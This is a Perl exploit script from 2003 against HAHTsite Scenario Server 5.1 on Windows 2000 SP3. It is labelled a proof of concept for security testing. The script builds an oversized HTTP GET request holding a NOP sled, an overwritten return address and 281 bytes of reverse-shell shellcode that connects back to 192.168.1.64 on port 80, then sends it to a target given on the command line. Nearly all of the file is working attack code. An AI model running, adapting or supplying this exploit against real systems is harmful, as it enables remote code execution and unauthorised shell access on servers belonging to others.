#!/usr/bin/perl
#ooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOO
#
#  ************************************************** !!! WARNING !!! ***********************************************************
#  *                                            FOR SECURITY TESTiNG ONLY!                                                      *
#  ******************************************************************************************************************************
#  * By using this code you agree that I makes no warranties or representations, express or implied, about the                  *
#  * accuracy, timeliness or completeness of this, including without limitations the implied warranties of                      *
#  * merchantability and fitness for a particular purpose.                                                                      *
#  * I makes NO Warranty of non-infringement. This code may contain technical inaccuracies or typographical errors.             *
#  * This code can never be copyrighted or owned by any commercial company, under no circumstances what so ever.                *
#  * but can be use for as long the developer, are giving explicit approval of the usage, and the user understand               *
#  * and approve of all the parts written in this notice.                                                                       *
#  * This program may NOT be used by any Danish company, unless explicit written permission from the developer .                *
#  * Neither myself nor any of my Affiliates shall be liable for any direct, incidental, consequential, indirect                *
#  * or punitive damages arising out of access to, inability to access, or any use of the content of this code,                 *
#  * including without limitation any PC, other equipment or other property, even if I am Expressly advised of                  *
#  * the possibility of such damages. I DO NOT encourage criminal activities. If you use this code or commit                    *
#  * criminal acts with it, then you are solely responsible for your own actions and by use, downloading,transferring,          *
#  * and/or reading anything from this code you are considered to have accepted the terms and conditions and have read          *
#  * this disclaimer. Once again this code is for penetration testing purposes only. And once again, DO NOT DISTRIBUTE!         *
#  ******************************************************************************************************************************
#
# Notes:
#   The more complex our security becomes, the more complex our enemy's 
#         efforts must be. The more we seek to shut him out, the better he must 
#         learn to become at breaking in. Each new level of security that we manage 
#         becomes no more than a stepping stone for him who would surpass us, for 
#         he bases his next assault upon our best defenses.
#
#
#  Tested on : 
#            - Windows 2000 Server SP3
#            - HAHTsite Scenatio Server 5.1 with Patch 6
#       
#       The following error will end up in the event viewer: 
#               ------------------------------------------------------------------------ 
#               Event Type:     Error 
#               Event Source:   HAHTsite 5.1 Controller 
#               Event Category: None 
#               Event ID:       1032 
#               Description: 
#               Unexpected termination of server hsadmsrv with PID=xxxx: Exit Reason:
#               Unknown Reason 
#               ------------------------------------------------------------------------ 
#
#   EXPLOiT DESCRIPTION 
# |---------------------| 
# |1237 bytes of NOP's  | 
# |---------------------| 
# |   EIP = 77F902BC    |       This is where we goto the CALL ESI function address 0x7171354a -----,
# |---------------------|                                                                           | 
# |  76 bytes of NOP's  |                                                                           | 
# |---------------------|                                                                           | 
# | 281 bytes SHELLCODE |       <---------------------- ESI Pointing here --------------------------´ 
# |---------------------|       
# | 142 bytes of NOP's  |                                                                           
# |---------------------|                                                                            
# 
# Default setup:
#  http://<IP or Hostname>/hsadmindistributed/hsadmin.html
# 
use IO::Socket; 
use Getopt::Long; 
my $host_header; 


#  Reverse Shellcode - Windows 2000 SP3 - 281 bytes 
#  Connects back: 192.168.1.64 and port 80
#  sctune.c v1.2 (c) 2002-2003 by 3APA3A http://www.security.nnov.ru/soft/
$shellcode_sp3 = join ("", 
  "\x33\xc0\x33\xc9\xb1\x58\x2b\xe1\x8b\xfc\xf3\xaa\x8b\xec\x66\xb8",
  "\x6c\x6c\x66\x50\xb8\x33\x32\x2e\x64\x50\xb8\x77\x73\x32\x5f\x50",
  "\x8b\xc4\x50\xb8\x64\x9f\xe8\x77\xff\xd0\x8b\xe5\x89\x04\x24\x66",
  "\xbb\x74\x41\x66\x53\xbb\x6f\x63\x6b\x65\x53\xbb\x57\x53\x41\x53",
  "\x53\x8b\xdc\x53\x50\xbb\x18\x9b\xe8\x77\xff\xd3\x8b\xe5\x33\xdb",
  "\x53\x53\x53\xb3\x06\x53\xb3\x01\x53\x43\x53\xff\xd0\x8b\xe5\x33",
  "\xdb\xb3\x14\x03\xe3\xb3\x44\x89\x1c\x24\xb3\x2c\x03\xe3\x33\xc9",
  "\xfe\xc5\x89\x0c\x24\xb3\x0c\x03\xe3\x89\x04\x24\x44\x44\x44\x44",
  "\x89\x04\x24\x44\x44\x44\x44\x89\x04\x24\x8b\xe5\x03\xe3\x68\xc0",
  "\xa8\x01\x40\x66\xbb\x41\x64\x32\xdb\x66\x53\x33\xdb\x43\x43\x66",
  "\x53\x8b\xe5\x8b\x1c\x24\x89\x04\x24\x66\xb8\x74\x74\x32\xe4\x66",
  "\x50\x66\xb8\x65\x63\x66\x50\xb8\x63\x6f\x6e\x6e\x50\x8b\xc4\x50",
  "\x53\xbb\x18\x9b\xe8\x77\xff\xd3\x8b\xe5\x33\xdb\xb3\x10\x53\x45",
  "\x45\x45\x45\x55\x4d\x4d\x4d\x4d\x8b\xdd\xff\x33\xff\xd0\x8b\xe5",
  "\x66\xb8\x65\x65\x32\xe4\x66\x50\x66\xb8\x65\x78\x66\x50\xb8\x63",
  "\x6d\x64\x2e\x50\x8b\xc4\x8b\xcd\x51\x33\xdb\xb3\x14\x03\xcb\x51",
  "\x33\xdb\x53\x53\x53\x51\x53\x53\x50\x53\xb8\x44\x9b\xe9\x77\xff",
  "\xd0\x50\xb8\x5c\xcf\xe9\x77\xff\xd0",

);

# EIP ---> Look for CALL ESI (ComCtl32 = 77F902BC in Win2000 SP3) 
$buf = join ("", "\x91" x 1237, "\xBC\x02\xF9\x77", "\x90" x 76, $shellcode_sp3, "\x90" x 142); 

GetOptions( 
        "target=s"      => \$target, 
        "port=i"        => \$port, 
        "exploit=s"     => \$exploit,
        "check"         => \$check,
        "help|?"        => sub { 
                                print "\n" x 90; 
                                print "\t #################################################\n"; 
                                print "\t #   HAHTsite Scenatio Server 5.1 PoC Exploit    #\n"; 
                                print "\t #  ************* !!! WARNING !!! ************   #\n"; 
                                print "\t #  ************ DO NOT DISTRIBUTE ***********   #\n"; 
                                print "\t #  ** FOR PRIVATE AND EDUCATIONAL USE ONLY! *   #\n"; 
                                print "\t #  ******************************************   #\n"; 
                                print "\t #             (c)2003 by Dennis Rand            #\n";
                                print "\t #################################################\n"; 
                                print "\n\t -target\t\t eg.: 127.0.0.1\n"; 
                                print "\t -port\t\t\t eg.: 80\n\n"; 
                                print "\tUsage eg.: hahtsite.pl -t 127.0.0.1 -p 80\n"; 
                                exit; 
                                } 
); 

$error .= "Error: You must specify a target host\n" if ((!$target)); 
$error .= "Error: You must specify a port number\n" if ((!$port)); 



if ($error) 
{ 
   print "Try Hahtsite.pl -help or -?' for more information.\n$error\n" ; 
   exit; 
} 

$host_header = join ("", 
    "Host: $target\r\n",
    "Accept: */*\r\n",
    "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
    "Content-Type: test/plain\r\n",
    "Connection: Close");

if ($target)
{ 
   print "\n" x 90; 
   print "\n\n"; 
   $host = $target; 
   attack(); 
}; 

sub attack 
{ 
   print "[*] Target system - HAHTsite 5.1 Controller\n\n";
   print "[*] Target :\t\t\t $target\n"; 
   print "[*] Port :\t\t\t $port\n";
   print "[*] Shellcode Size :\t\t ".length($shellcode_sp3)." Bytes\n"; 
   print "[*] Total packet Size:\t\t ".length($buf)." Bytes\n"; 
   print "[*] Connecting To Target\n"; 
   $| = 1; 

   my $connection = IO::Socket::INET->new(Proto =>"tcp", 
                                          PeerAddr =>$target, 
                                          PeerPort =>$port) || die "[*] Failed to connect to $target port $port\n";

   print $connection "GET /scripts/hsrun.exe/hsadminDistributed/hsadminDistributed/$buf.htx;start=HS_FramesPage?  HTTP/1.1\r\n$host_header\r\n\r\n"; 
   while(<$connection>){$result .= $_;}
   if($result =~ /unexpected error/) {print "[*] System is Vulnerable\n";};
   if($result !~ /unexpected error/) {print "[*] System is Not Vulnerable\n";};
   close $connection; 
   exit; 
}; 